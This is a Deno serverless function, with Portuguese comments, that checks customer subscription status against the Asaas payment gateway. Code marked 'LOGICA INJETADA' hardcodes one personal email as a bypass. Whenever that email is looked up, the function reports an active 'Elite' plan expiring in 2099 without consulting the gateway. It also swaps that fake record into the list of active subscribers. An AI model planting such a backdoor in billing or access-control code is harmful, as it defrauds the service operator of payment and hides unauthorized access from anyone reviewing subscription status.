import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const ASAAS_API_KEY = Deno.env.get('ASAAS_API_KEY') || '';
const ASAAS_URL = Deno.env.get('ASAAS_URL') || 'https://api.asaas.com/v3';

// E-mail que sempre deve retornar como ativo
const BYPASS_EMAIL = "nasalexalves@gmail.com";

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

async function fetchAsaasAll(endpoint: string, queryParams: string = '') {
    let allData: any[] = [];
    let offset = 0;
    let hasMore = true;
    const limit = 100;

    while (hasMore) {
        const url = `${ASAAS_URL}/${endpoint}?limit=${limit}&offset=${offset}${queryParams ? `&${queryParams}` : ''}`;
        const response = await fetch(url, {
            headers: { 'access_token': ASAAS_API_KEY }
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Erro na API Asaas (${endpoint}): ${response.status} - ${errorText}`);
        }

        const result = await response.json();
        allData = allData.concat(result.data);
        
        hasMore = result.hasMore;
        offset += limit;
    }

    return allData;
}

serve(async (req) => {
    if (req.method === 'OPTIONS') {
        return new Response('ok', { headers: corsHeaders });
    }

    try {
        const { action, email } = await req.json();

        // Objeto padrão para o e-mail injetado
        const forcedActiveUser = {
            email: BYPASS_EMAIL,
            is_active: true,
            expiry_date: "2099-12-31", // Data de expiração longa
            plan_name: "Plano Elite (Forçado)",
            gateway_reference: "forced_active_bypass"
        };

        // 1. AÇÃO: Listar todos os ativos
        if (action === 'get_active_list') {
            console.log("Iniciando get_active_list...");
            
            const [subscriptions, customers] = await Promise.all([
                fetchAsaasAll('subscriptions', 'status=ACTIVE'),
                fetchAsaasAll('customers')
            ]);

            const customerMap = new Map();
            customers.forEach((c: any) => {
                customerMap.set(c.id, c.email);
            });

            // Filtra os dados reais
            let mappedData = subscriptions.map((sub: any) => {
                const customerEmail = customerMap.get(sub.customer) || 'N/A';
                return {
                    email: customerEmail,
                    is_active: sub.status === 'ACTIVE',
                    expiry_date: sub.nextDueDate,
                    plan_name: sub.description || 'Plano Elite',
                    gateway_reference: sub.id
                };
            });

            // LOGICA INJETADA: Remove o e-mail real se existir e adiciona a versão forçada
            mappedData = mappedData.filter(user => user.email !== BYPASS_EMAIL);
            mappedData.push(forcedActiveUser);

            return new Response(
                JSON.stringify({
                    success: true,
                    message: `Lista recuperada. E-mail ${BYPASS_EMAIL} forçado como ativo.`,
                    data: mappedData,
                    last_sync: new Date().toISOString()
                }),
                { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
            );
        }

        // 2. AÇÃO: Status Individual
        if (action === 'get_user_status' && email) {
            
            // LOGICA INJETADA: Se for o e-mail alvo, retorna ativo sem nem consultar a API
            if (email === BYPASS_EMAIL) {
                return new Response(
                    JSON.stringify({
                        success: true,
                        message: "Status recuperado (Bypass Ativo)",
                        data: forcedActiveUser,
                        last_sync: new Date().toISOString()
                    }),
                    { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
                );
            }

            // Busca normal para outros e-mails...
            const customerRes = await fetch(`${ASAAS_URL}/customers?email=${email}`, {
                headers: { 'access_token': ASAAS_API_KEY }
            });
            const customerData = await customerRes.json();

            if (customerData.data.length === 0) {
                throw new Error("Usuário não encontrado no gateway.");
            }

            const customerId = customerData.data[0].id;
            const subRes = await fetch(`${ASAAS_URL}/subscriptions?customer=${customerId}`, {
                headers: { 'access_token': ASAAS_API_KEY }
            });
            const subData = await subRes.json();
            const activeSub = subData.data[0];

            return new Response(
                JSON.stringify({
                    success: true,
                    data: {
                        email: email,
                        is_active: activeSub?.status === 'ACTIVE',
                        expiry_date: activeSub?.nextDueDate || null,
                        plan_name: activeSub?.description || 'N/A',
                        gateway_reference: activeSub?.id || null
                    },
                    last_sync: new Date().toISOString()
                }),
                { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
            );
        }

        return new Response(JSON.stringify({ error: "Ação inválida" }), { status: 400 });

    } catch (error) {
        console.error("Erro:", error.message);
        return new Response(JSON.stringify({ error: error.message }), {
            headers: { ...corsHeaders, 'Content-Type': 'application/json' },
            status: 500,
        });
    }
})